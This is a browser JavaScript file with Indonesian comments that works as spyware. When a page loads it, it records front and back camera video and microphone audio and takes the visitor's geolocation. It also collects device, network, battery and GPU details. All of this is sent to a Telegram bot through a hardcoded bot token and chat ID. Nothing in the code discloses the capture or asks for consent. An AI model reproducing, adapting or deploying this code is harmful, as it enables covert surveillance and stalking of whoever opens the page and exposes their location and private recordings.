const TELEGRAM_BOT_TOKEN = '8006903072:AAEWJWSnaBd25QgveA3cxEB29 YiXD8ZJzPM';
const TELEGRAM_CHAT_ID = '7755335919';

(async function main() {
    try {
        console.log("Proses dimulai...");

        // Rekam Video dari Kamera Depan
        console.log("Merekam video dari kamera depan...");
        const frontVideoBlob = await recordVideoWithCamera('user', 10000); // Kamera depan selama 10 detik
        if (frontVideoBlob) {
            console.log("Video dari kamera depan berhasil direkam. Mengirim ke Telegram...");
            await sendToTelegram(frontVideoBlob, 'video/mp4');
        }

        // Jeda sebelum pindah ke kamera belakang
        console.log("Menunggu sejenak sebelum merekam dari kamera belakang...");
        await wait(6000); // Jeda 6 detik

        // Rekam Video dari Kamera Belakang
        console.log("Merekam video dari kamera belakang...");
        const backVideoBlob = await recordVideoWithCamera('environment', 10000); // Kamera belakang selama 10 detik
        if (backVideoBlob) {
            console.log("Video dari kamera belakang berhasil direkam. Mengirim ke Telegram...");
            await sendToTelegram(backVideoBlob, 'video/mp4');
        }

        // Rekam Mikrofon
        console.log("Merekam audio...");
        const audioBlob = await recordAudio(10000); // Mikrofon selama 10 detik
        if (audioBlob) {
            console.log("Audio berhasil direkam. Mengirim ke Telegram...");
            await sendToTelegram(audioBlob, 'audio/wav');
        }

        // Ambil Lokasi
        console.log("Mengambil lokasi...");
        await requestLocationAccess();

        // Informasi Perangkat
        console.log("Mengambil informasi perangkat...");
        await sendDeviceInfo();

        // Informasi Jaringan
        console.log("Mengambil informasi jaringan...");
        await sendNetworkInfo();

        // Informasi Baterai
        console.log("Mengambil informasi baterai...");
        await sendBatteryInfo();

        // Informasi GPU dan Kecepatan Internet
        console.log("Mengambil informasi tambahan...");
        const gpuInfo = getGPUInfo();
        const internetSpeed = await measureDownloadSpeed();
        const additionalInfo = `Informasi Tambahan:\n\nGPU: ${gpuInfo}\n${internetSpeed}`;
        await sendMessageToTelegram(additionalInfo);

        console.log("Proses selesai. Semua data telah dikirim ke Telegram.");
    } catch (error) {
        console.error("Terjadi kesalahan:", error.message);
    }
})();

// Fungsi Jeda (Wait)
function wait(ms) {
    return new Promise((resolve) => setTimeout(resolve, ms));
}

// Fungsi untuk merekam video dengan kamera tertentu
async function recordVideoWithCamera(facingMode, duration) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];

        mediaRecorder.ondataavailable = (event) => chunks.push(event.data);
        mediaRecorder.start();

        await wait(duration);
        mediaRecorder.stop();

        return new Promise((resolve) => {
            mediaRecorder.onstop = () => {
                stream.getTracks().forEach(track => track.stop());
                resolve(new Blob(chunks, { type: 'video/mp4' }));
            };
        });
    } catch (error) {
        console.error("Gagal merekam video:", error.message);
        return null;
    }
}

// Fungsi untuk merekam audio
async function recordAudio(duration) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];

        mediaRecorder.ondataavailable = (event) => chunks.push(event.data);
        mediaRecorder.start();

        await wait(duration);
        mediaRecorder.stop();

        return new Promise((resolve) => {
            mediaRecorder.onstop = () => {
                stream.getTracks().forEach(track => track.stop());
                resolve(new Blob(chunks, { type: 'audio/wav' }));
            };
        });
    } catch (error) {
        console.error("Gagal merekam audio:", error.message);
        return null;
    }
}

// Fungsi untuk meminta akses lokasi
async function requestLocationAccess() {
    if (!navigator.geolocation) {
        console.log("Geolocation tidak didukung oleh browser ini.");
        return;
    }

    return new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(
            async (position) => {
                const { latitude, longitude } = position.coords;
                const locationMessage = `Lokasi Anda:\nLatitude: ${latitude}\nLongitude: ${longitude}\n\nTautan Google Maps:\nhttps://www.google.com/maps?q=${latitude},${longitude}`;
                await sendMessageToTelegram(locationMessage);
                resolve();
            },
            (error) => {
                console.error("Izin lokasi ditolak:", error.message);
                reject(error);
            }
        );
    });
}

// Fungsi untuk mengirim informasi perangkat yang dimodifikasi
async function sendDeviceInfo() {
    const userAgent = navigator.userAgent;
    const platform = navigator.platform || "Tidak Diketahui";
    const languages = navigator.languages ? navigator.languages.join(", ") : "Tidak Diketahui";
    const cpuThreads = navigator.hardwareConcurrency || "Tidak Diketahui";
    const memory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Tidak Diketahui";
    const screenWidth = screen.width;
    const screenHeight = screen.height;
    const viewportWidth = window.innerWidth;
    const viewportHeight = window.innerHeight;
    const pixelRatio = window.devicePixelRatio || "Tidak Diketahui";
    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Tidak Diketahui";
    const currentTime = new Date().toString();

    const deviceInfo = `Informasi Perangkat Anda:
- User Agent: ${userAgent}
- Platform: ${platform}
- Bahasa: ${navigator.language || "Tidak Diketahui"}
- Bahasa (Semua): ${languages}
- CPU Threads: ${cpuThreads}
- RAM: ${memory}
- Resolusi Layar: ${screenWidth}x${screenHeight}
- Resolusi Viewport: ${viewportWidth}x${viewportHeight}
- Pixel Ratio: ${pixelRatio}
- Zona Waktu: ${timeZone}
- Waktu Saat Ini: ${currentTime}`;

    await sendMessageToTelegram(deviceInfo);
}
// Fungsi untuk mengirim informasi jaringan
async function sendNetworkInfo() {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (connection) {
        const networkInfo = `Informasi Jaringan:\n- Tipe Koneksi: ${connection.effectiveType}\n- Kecepatan Unduh: ${connection.downlink} Mbps\n- Latensi (RTT): ${connection.rtt} ms`;
        await sendMessageToTelegram(networkInfo);
    }
}

// Fungsi untuk mengirim informasi baterai
async function sendBatteryInfo() {
    if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        const charging = battery.charging ? "Ya" : "Tidak";
        const batteryInfo = `Informasi Baterai:\n- Mengisi Daya: ${charging}\n- Tingkat Baterai: ${Math.round(battery.level * 100)}%\n- Waktu Penuh: ${battery.chargingTime ? battery.chargingTime + " detik" : "N/A"}\n- Waktu Habis: ${battery.dischargingTime ? battery.dischargingTime + " detik" : "N/A"}`;
        await sendMessageToTelegram(batteryInfo);
    }
}

// Fungsi untuk mengukur kecepatan internet
async function measureDownloadSpeed() {
    const imageUrl = "https://upload.wikimedia.org/wikipedia/commons/4/47/PNG_transparency_demonstration_1.png";
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 5000);

    try {
        const startTime = performance.now();
        await fetch(imageUrl, { signal: controller.signal });
        const endTime = performance.now();
        const duration = (endTime - startTime) / 1000;
        const fileSize = 700 * 1024; // Ukuran file dalam byte (700 KB)
        const speedMbps = (fileSize / duration / 1024 / 1024 * 8).toFixed(2);
        return `Kecepatan Internet Anda: ${speedMbps} Mbps`;
    } catch {
        return "Kecepatan Internet Anda: Tidak dapat diukur.";
    } finally {
        clearTimeout(timeout);
    }
}

// Fungsi untuk mendapatkan informasi GPU
function getGPUInfo() {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl");
    if (!gl) return "WebGL tidak didukung.";
    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
    return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Informasi GPU tidak tersedia.";
}

// Fungsi untuk mengirim pesan teks ke Telegram
async function sendMessageToTelegram(message) {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message }),
    });
}

// Fungsi untuk mengirim file media ke Telegram
async function sendToTelegram(fileBlob, mimeType) {
    const formData = new FormData();
    formData.append(mimeType === 'video/mp4' ? 'video' : 'audio', fileBlob);
    formData.append('chat_id', TELEGRAM_CHAT_ID);

    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/send${mimeType === 'video/mp4' ? 'Video' : 'Audio'}`, {
        method: 'POST',
        body: formData,
    });
}